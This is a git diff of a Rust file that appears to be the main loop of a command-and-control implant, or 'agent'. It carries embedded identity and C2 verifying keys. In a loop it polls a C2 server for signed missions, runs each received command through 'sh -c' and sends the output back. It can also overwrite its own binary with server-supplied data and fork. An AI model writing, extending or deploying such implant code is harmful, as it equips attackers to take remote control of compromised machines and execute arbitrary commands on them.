@@ -1,7 +1,10 @@
+use std::{fs, process::Command, thread, time};
+
 // use arti_client::{TorClient, TorClientConfig};
 // use arti_hyper::ArtiHttpConnector;
 use base64::{prelude::BASE64_STANDARD, Engine as _};
-use common::{api, crypto, Mission, Task};
+use common::{api, crypto};
+use log::{error, info};
 // use futures::{Stream, StreamExt};
 // use hyper::Body;
 // use tls_api::{TlsConnector as TlsConnectorTrait, TlsConnectorBuilder};
@@ -70,45 +73,33 @@ use common::{api, crypto, Mission, Task};
 //     Ok(())
 // }
 
+mod client;
+mod error;
+
+type AgentResult<T> = Result<T, error::AgentError>;
+
 const IDENTITY: &str = "1nlpuul3mNmk9oJ27Usp5Ekfm+MM1CMYBX8FiLTwqd8=";
 const C2_VERIFYING_KEY: &str = "IX+xwv+SMQr4QZB8ba1n/fx3W3t5KvHQoCtBJ5HJZuk=";
 
-// async fn get_mission() -> anyhow::Result<Vec<Mission>> {
-//     let http = hyper::Client::new();
-//     let mut resp = http.get("http://localhost:3000".try_into()?).await?;
+fn main() -> AgentResult<()> {
+    env_logger::init();
+    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░░▒▓██████████████▓▒░░▒▓████████▓▒░░▒▓███████▓▒░");
+    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░       ");
+    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░       ");
+    info!("░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░  ░▒▓██████▓▒░ ");
+    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░");
+    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░");
+    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░ ");
 
-//     println!("Status: {}", resp.status());
-//     let body = hyper::body::to_bytes(resp.body_mut()).await?;
-//     println!("Body: {}", std::str::from_utf8(&body)?);
-//     Ok(serde_json::from_slice(&body)?)
-// }
-
-async fn get_mission() -> anyhow::Result<Vec<Mission>> {
-    let mut signing_key = crypto::get_identity_from(
+    let mut signing_key = crypto::get_signing_key_from(
         BASE64_STANDARD
             .decode(IDENTITY)
             .unwrap()
             .as_slice()
             .try_into()
             .unwrap(),
-    )?;
-
-    let (public_key, private_key, signature) =
-        crypto::generate_key_exchange_key_pair(&mut signing_key);
-
-    let response = ureq::get("http://localhost:3000")
-        .send_json(ureq::json!(
-            {
-                "identity": signing_key.verifying_key().as_bytes(),
-                "publicKey": public_key,
-                "signature": signature.to_bytes().as_slice(),
-            }
-        ))
-        .map_err(|e| anyhow::anyhow!(e))?;
-
-    // println!("Status: {}", response.status());
-    let body: api::Response = response.into_json().unwrap();
-    let verifying_key = crypto::VerifyingKey::from_bytes(
+    );
+    let c2_verifying_key = crypto::VerifyingKey::from_bytes(
         BASE64_STANDARD
             .decode(C2_VERIFYING_KEY)
             .unwrap()
@@ -117,49 +108,42 @@ async fn get_mission() -> anyhow::Result<Vec<Mission>> {
             .unwrap(),
     )
     .unwrap();
-    crypto::verify(
-        &verifying_key,
-        body.signature,
-        &[],
-        body.public_key,
-        &body.encrypted_data,
-        body.nonce,
-    )
-    .unwrap();
-    let decrypted_data = crypto::decrypt(
-        &body.encrypted_data,
-        body.public_key,
-        private_key,
-        body.nonce,
-    )
-    .unwrap();
-    println!(
-        "Decrypted data: {:?}",
-        std::str::from_utf8(&decrypted_data).unwrap()
-    );
-    Ok(vec![])
-    // Ok(serde_json::from_slice(body.as_bytes()).map_err(|e| anyhow::anyhow!(e))?)
-}
 
-#[tokio::main]
-async fn main() -> anyhow::Result<()> {
-    println!("Starting agent");
     loop {
-        for mission in get_mission().await? {
-            for task in mission.tasks {
-                match task {
-                    Task::Update(data) => {
-                        println!("Updating with data: {:?}", data);
-                    }
-                    Task::Execute(command) => {
-                        println!("Executing command: {:?}", command);
-                    }
-                    Task::Stop => {
-                        println!("Stopping agent");
-                        return Ok(());
+        match client::get_mission(&mut signing_key, &c2_verifying_key) {
+            Ok(mission) => {
+                if let Some(mission) = mission {
+                    match &mission.task {
+                        api::Task::Update(data) => {
+                            let agent_bin = std::env::args().next().expect("arguments provided");
+                            info!("Updating agent '{agent_bin}'");
+                            fs::write(agent_bin, data)?;
+                            if unsafe { libc::fork() } == 0 {
+                                client::report_mission(&mut signing_key, mission, "OK")?;
+                            } else {
+                                break;
+                            }
+                        }
+                        api::Task::Execute(command) => {
+                            info!("Executing command: {command}");
+                            let output = Command::new("sh").arg("-c").arg(command).output()?;
+                            client::report_mission(
+                                &mut signing_key,
+                                mission,
+                                &String::from_utf8(output.stdout).unwrap(),
+                            )?;
+                        }
+                        api::Task::Stop => {
+                            client::report_mission(&mut signing_key, mission, "OK")?;
+                            break;
+                        }
                     }
                 }
             }
+            Err(e) => error!("Error: {e}"),
         }
+        thread::sleep(time::Duration::from_secs(5));
     }
+    info!("Stopping agent");
+    Ok(())
 }
